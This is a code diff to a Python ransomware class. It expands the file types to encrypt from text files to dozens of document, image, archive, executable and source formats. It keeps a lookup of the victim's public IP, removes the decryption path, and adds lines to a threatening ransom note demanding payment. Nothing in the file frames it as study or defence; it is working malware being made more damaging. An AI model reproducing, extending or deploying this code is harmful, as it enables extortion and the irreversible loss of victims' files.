@@ -22,7 +22,12 @@ class RansomWare:
     
     # File exstensions to seek out and Encrypt
     file_exts = [
-        'txt',
+        'txt', 'png', 'jpg', 'html', 'docx', 'doc', 'xls', 'xlsx', 'ppt',
+        'pptx', 'pdf', 'mp3', 'mp4', 'wav', 'zip', 'rar', '7z', 'exe', 'msi',
+        'jpeg', 'gif', 'bmp', 'ico', 'csv', 'psd', 'py', 'pyc', 'pyo', 'pyw',
+        'txt', 'text', 'log', 'rtf', 'rtx', 'sql', 'asp', 'aspx', 'asx',
+        'csv', 'xml', 'xsl', 'xsd', 'js', 'json', 'css', 'pdf', 'zip', 'rar',
+        'htm', 'html', 'shtml', 'xhtml', 'php', 'php3', 'php4', 'php5',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png', 
@@ -46,7 +51,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'U:\Victim' # Debugging/Testing
+        self.localRoot = r'H:/Victim' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -100,14 +105,14 @@ class RansomWare:
                 # print(data)
                 # Encrypt data from file
                 _data = self.crypter.encrypt(data)
+                print(f'Encrypted {file_path}')
                 # Log file encrypted and print encrypted contents - [debugging]
                 # print('> File encrpyted')
                 # print(_data)
             else:
                 # Decrypt data from file
-                _data = self.crypter.decrypt(data)
                 # Log file decrypted and print decrypted contents - [debugging]
-                # print('> File decrpyted')
+                print(f"> Can\'t decrypt file {file_path}")
                 # print(_data)
         with open(file_path, 'wb') as fp:
             # Write encrypted/decrypted data to file using same filename to overwrite original file
@@ -150,6 +155,7 @@ class RansomWare:
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
 The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
+
 There is no way to restore your data without a special key.
 Only we can decrypt your files!
 
@@ -168,8 +174,11 @@ WARNING:
 Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
 Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
 -and there is a high chance you will lose your files forever.
+
 Do NOT send "PAID" button without paying, price WILL go up for disobedience.
+
 Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
+
 ''')
 
 
